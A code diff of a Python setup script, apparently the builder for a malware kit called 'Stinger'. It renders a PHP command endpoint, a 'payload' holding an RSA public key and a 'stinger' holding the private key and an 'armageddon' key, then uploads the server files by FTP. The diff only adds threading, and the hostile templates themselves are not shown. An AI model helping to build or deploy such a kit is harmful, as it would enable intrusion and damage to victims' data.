@@ -1,7 +1,7 @@
 # Setup Stinger
 
 # Libraries
-import ftplib, argparse, os, requests, rsa
+import ftplib, argparse, os, requests, rsa, threading
 from jinja2 import Environment, FileSystemLoader
 
 # Parser Initialization
@@ -65,21 +65,34 @@ try:
     
     # Creating Server Side Files
     print("Creating Server Files")
-    # Create index.php    
-    indexTemplate = env.get_template("index.md")
-    renderIndex = indexTemplate.render(postKey=postKey, getKey=getKey, table=tableName, 
-                                       tableBegin=tableBegin, tableID=tableID, armageddonKey=armageddonKey)
-    with open(f"index.php","w") as file:
-        file.write(renderIndex)
-    file.close()
+    
+    # Create index.php   
+    def createIndex(env): 
+        indexTemplate = env.get_template("index.md")
+        renderIndex = indexTemplate.render(postKey=postKey, getKey=getKey, table=tableName, 
+                                        tableBegin=tableBegin, tableID=tableID, armageddonKey=armageddonKey)
+        with open(f"index.php","w") as file:
+            file.write(renderIndex)
+        file.close()
     
     # Create config.php
-    configTemplate = env.get_template("config.md")
-    renderConfig = configTemplate.render(sqlHost=args.sqlHost, sqlUser=args.sqlUser, 
-                                         sqlPass=args.sqlPass, sqlName=args.sqlName)
-    with open(f"config.php","w") as file:
-        file.write(renderConfig)
-    file.close()
+    def createConfig(env):
+        configTemplate = env.get_template("config.md")
+        renderConfig = configTemplate.render(sqlHost=args.sqlHost, sqlUser=args.sqlUser, 
+                                            sqlPass=args.sqlPass, sqlName=args.sqlName)
+        with open(f"config.php","w") as file:
+            file.write(renderConfig)
+        file.close()
+        
+    # Threading for Server Side File Creation
+    indexThread = threading.Thread(target=createIndex, args=(env,))
+    configThread = threading.Thread(target=createConfig ,args=(env,))
+    
+    indexThread.start()
+    configThread.start()
+    
+    indexThread.join()
+    configThread.join()
     
     # Store files in FTP
     ftpServer.storbinary("STOR index.php", open(f"index.php", "rb"))
@@ -136,28 +149,40 @@ try:
                 else:
                     print("Failed to sent GET request")   
             else:
-                print("Failed to sent POST request")       
-        # Fix this
-        # print("Test failed") 
+                print("Failed to sent POST request")
+        else:
+            print("Test Failed")
     else:
         print("Failed to connect to website")
     
     # Create Stinger
-    print("Creating Stinger & Payload")
-    stingerTemplate = env.get_template("stinger.md")
-    renderStinger = stingerTemplate.render(getKey=getKey, tableBegin=tableBegin , website=website, 
-                                           tableID=tableID, armageddonKey=armageddonKey, 
-                                           privateKey=privateKey)
-    with open(f"stinger.py","w") as file:
-        file.write(renderStinger)
-    file.close()
+    def createStinger(env):
+        print("Creating Stinger & Payload")
+        stingerTemplate = env.get_template("stinger.md")
+        renderStinger = stingerTemplate.render(getKey=getKey, tableBegin=tableBegin , website=website, 
+                                            tableID=tableID, armageddonKey=armageddonKey, 
+                                            privateKey=privateKey)
+        with open(f"stinger.py","w") as file:
+            file.write(renderStinger)
+        file.close()
     
     # Create Payload
-    payloadTemplate = env.get_template("payload.md")
-    renderPayload = payloadTemplate.render(postKey=postKey, website=website, publicKey=publicKey)
-    with open(f"payload.py","w") as file:
-        file.write(renderPayload)
-    file.close()
+    def createPayload(env):
+        payloadTemplate = env.get_template("payload.md")
+        renderPayload = payloadTemplate.render(postKey=postKey, website=website, publicKey=publicKey)
+        with open(f"payload.py","w") as file:
+            file.write(renderPayload)
+        file.close()
+    
+    # Threading for Script Creation
+    payloadThread = threading.Thread(target=createPayload, args=(env,))
+    stingerThread = threading.Thread(target=createStinger ,args=(env,))
+    
+    payloadThread.start()
+    stingerThread.start()
+    
+    payloadThread.join()
+    stingerThread.join()
     
     # Delete local files
     os.remove("index.php")
